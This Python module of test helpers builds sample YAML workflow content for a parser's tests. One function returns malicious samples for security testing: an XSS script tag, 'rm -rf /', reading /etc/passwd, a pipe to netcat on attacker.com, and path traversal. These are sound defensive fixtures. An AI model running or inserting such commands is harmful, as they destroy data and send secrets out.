#!/usr/bin/env python3

"""
Helper functions for tests.

This module provides utility functions for reading mixed-content files,
splitting YAML, and other common test operations without using conditionals.
"""

from pathlib import Path
from typing import Any, Dict, List, Tuple, Union

import yaml


def read_mixed_content_file(file_path: Union[str, Path]) -> str:
    """
    Read mixed content file and return as string.
    Args:
        file_path: Path to the mixed content file
    Returns:
        File contents as string
    Raises:
        FileNotFoundError: If file doesn't exist
        IOError: If file can't be read
    """
    path = Path(file_path)
    return path.read_text(encoding="utf-8")


def split_yaml_documents(content: str) -> List[str]:
    """
    Split YAML content into individual document strings.
    Args:
        content: YAML content containing multiple documents
    Returns:
        List of individual YAML document strings
    """
    # Split on YAML document separators
    parts = content.split("---")

    # Filter parts using list comprehension instead of loop
    documents = [
        part.strip()
        for part in parts
        if part.strip() and not part.strip().startswith("#")
    ]

    return documents


def create_large_messy_content(count: int = 50) -> str:
    """
    Generate large messy content for performance testing.
    Args:
        count: Number of workflow documents to generate
    Returns:
        Large messy content string
    """
    workflow_template = """
---
name:Workflow {i}
command:echo "test {i}"&&ls -la
description:Generated workflow number {i}
tags:test,generated,item-{i}
shells:bash,zsh
arguments:
-name:input
 description:Input for workflow {i}
 default_value:default-{i}
"""

    return "\n".join(workflow_template.format(i=i) for i in range(count))


def create_large_mangled_content(count: int = 100) -> str:
    """
    Generate large mangled content for robust parsing tests.
    Args:
        count: Number of mangled documents to generate
    Returns:
        Large mangled content string
    """
    mangled_template = """
name：Workflow {i}
command：echo"test{i}"&&ls -la
tags：[git，test，item{i}
description：Workflow number {i} with issues
"""

    return "\n---\n".join(mangled_template.format(i=i) for i in range(count))


def _validate_single_yaml_file(yaml_file: Path) -> Union[str, None]:
    """
    Validate a single YAML file.
    Args:
        yaml_file: Path to YAML file to validate
    Returns:
        Error message if invalid, None if valid
    """
    try:
        with open(yaml_file) as f:
            yaml.safe_load(f)
        return None
    except yaml.YAMLError as e:
        return f"File {yaml_file} is not valid YAML: {e}"


def validate_output_yaml_files(output_dir: Union[str, Path]) -> List[str]:
    """
    Validate that output files are valid YAML.
    Args:
        output_dir: Directory containing output files
    Returns:
        List of validation error messages (empty if all valid)
    """
    output_path = Path(output_dir)

    if not output_path.exists():
        return []

    yaml_files = list(output_path.rglob("*.yaml"))

    # Use list comprehension instead of loop
    validation_results = [
        _validate_single_yaml_file(yaml_file) for yaml_file in yaml_files
    ]

    # Filter out None values (valid files)
    errors = [error for error in validation_results if error is not None]

    return errors


def extract_document_types(documents: List[Tuple[Any, str]]) -> List[str]:
    """
    Extract document types from ContentSplitter results.
    Args:
        documents: List of (doc_type, content) tuples from ContentSplitter
    Returns:
        List of document type values as strings
    """
    return [doc_type.value for doc_type, _ in documents]


def create_test_content_by_type(content_type: str) -> Dict[str, Any]:
    """
    Create test content for a specific content type.
    Args:
        content_type: Type of content to create
    Returns:
        Dictionary containing test content
    """
    content_templates = {
        "workflow": {
            "name": "Test Workflow",
            "command": "echo test",
            "shells": ["bash"],
            "description": "A test workflow",
        },
        "prompt": {
            "name": "Test Prompt",
            "prompt": "Please {{action}} the following {{item}}",
            "arguments": [
                {"name": "action", "description": "Action to perform"},
                {"name": "item", "description": "Item to process"},
            ],
        },
        "rule": {
            "title": "Test Rule",
            "description": "A test rule",
            "guidelines": ["Follow this guideline"],
            "category": "testing",
        },
        "env_var": {"variables": {"TEST_VAR": "test_value"}, "scope": "user"},
        "notebook": {
            "title": "Test Notebook",
            "description": "A test notebook",
            "content": "# Test\n\n```bash\necho test\n```",
        },
    }

    return content_templates.get(content_type, {})


def create_malicious_content_samples() -> Dict[str, str]:
    """
    Create samples of malicious content for security testing.
    Returns:
        Dictionary mapping attack type to malicious content
    """
    return {
        "script_injection": """
            name: Evil Workflow
            command: <script>alert('xss')</script>
            description: This contains dangerous content
        """,
        "command_injection_semicolon": "echo test; rm -rf /",
        "command_injection_ampersand": "ls && cat /etc/passwd",
        "command_injection_pipe": "command | nc attacker.com 8080",
        "command_substitution": "test $(evil_command)",
        "path_traversal": "path/../../etc/passwd",
    }


def create_unicode_test_content() -> str:
    """
    Create content with Unicode characters for testing.
    Returns:
        Unicode test content string
    """
    return """
---
name: Workflow with émojis 🚀
command: echo "Hello 世界"
description: Testing Unicode handling
tags: unicode, test, 国际化
---
"""


def create_deeply_nested_structure(depth: int = 25) -> Dict[str, Any]:
    """
    Create deeply nested structure for testing.
    Args:
        depth: Depth of nesting
    Returns:
        Deeply nested dictionary structure
    """
    structure = {"a": {"b": {"c": {"d": {}}}}}

    # Use functools.reduce to build nested structure without explicit loop
    from functools import reduce

    return reduce(lambda acc, _: {"level": acc}, range(depth), structure)


def create_large_array_structure(size: int = 2000) -> List[int]:
    """
    Create large array for testing.
    Args:
        size: Size of the array
    Returns:
        Large array of integers
    """
    return list(range(size))
